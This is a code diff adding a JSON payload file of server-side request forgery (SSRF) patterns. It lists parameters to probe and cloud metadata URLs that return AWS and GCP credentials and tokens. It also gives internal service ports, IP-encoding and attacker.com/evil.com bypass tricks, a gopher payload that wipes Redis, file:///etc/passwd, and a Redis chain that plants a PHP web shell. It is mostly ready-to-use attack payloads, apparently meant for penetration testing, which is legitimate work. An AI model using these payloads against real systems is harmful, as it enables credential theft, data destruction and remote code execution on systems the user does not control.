@@ -1,0 +1,79 @@
+{
+  "type": "ssrf_patterns",
+  "description": "SSRF detection and exploitation patterns for accessing internal resources.",
+  "detection": {
+    "parameters_to_test": [
+      "url=", "path=", "dest=", "redirect=", "next=", "continue=",
+      "callback=", "webhook=", "src=", "href=", "img=", "file=",
+      "document=", "load=", "fetch=", "request=", "http=", "forward=",
+      "from=", "endpoint=", "api=", "action=", "data=", "target="
+    ],
+    "features_to_test": [
+      "PDF generation (url-to-pdf)",
+      "Image fetcher (avatar from URL)",
+      "Webhook callbacks",
+      "Import from URL",
+      "URL preview / link unfurling",
+      "Translation services (translate URL content)",
+      "PDF/screenshot services",
+      "Proxy endpoints"
+    ]
+  },
+  "probes": {
+    "basic": [
+      "http://127.0.0.1/",
+      "http://localhost/",
+      "http://0.0.0.0/",
+      "http://[::1]/",
+      "http://0/",
+      "http://127.1/"
+    ],
+    "cloud_metadata": {
+      "aws_imdsv1":   "http://169.254.169.254/latest/meta-data/",
+      "aws_imdsv1_keys": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "aws_imdsv2": "Requires X-aws-ec2-metadata-token header (two-step)",
+      "gcp":          "http://metadata.google.internal/computeMetadata/v1/",
+      "gcp_token":    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "azure":        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "alibaba":      "http://100.100.100.200/latest/meta-data/"
+    },
+    "internal_services": [
+      "http://127.0.0.1:8080/",
+      "http://127.0.0.1:8443/",
+      "http://127.0.0.1:6379/",
+      "http://127.0.0.1:27017/",
+      "http://127.0.0.1:5432/",
+      "http://127.0.0.1:9200/",
+      "http://127.0.0.1:2375/"
+    ]
+  },
+  "filter_bypass": {
+    "ip_encoding": [
+      "http://2130706433/",
+      "http://0x7f000001/",
+      "http://017700000001/",
+      "http://127.0.0.0x1/"
+    ],
+    "dns_rebinding": "Use a domain that resolves to 127.0.0.1 after initial DNS check",
+    "redirect_chain": "http://attacker.com/redirect → 302 to http://169.254.169.254/",
+    "url_confusion": [
+      "http://evil.com@127.0.0.1/",
+      "http://127.0.0.1#evil.com",
+      "http://127.0.0.1%252F/evil.com"
+    ],
+    "protocol_smuggling": [
+      "dict://127.0.0.1:6379/INFO",
+      "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+      "file:///etc/passwd"
+    ],
+    "case_variation": [
+      "HTTP://127.0.0.1/",
+      "hTTp://127.0.0.1/"
+    ]
+  },
+  "impact_chain": {
+    "aws_keys": "GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME → returns AWS access key + secret + session token",
+    "redis_rce": "gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html\\nCONFIG SET dbfilename shell.php\\nSET x '<?php system($_GET[cmd]);?>'\\nSAVE",
+    "internal_api": "Access unauthenticated internal admin API at http://127.0.0.1:8080/admin/"
+  }
+}
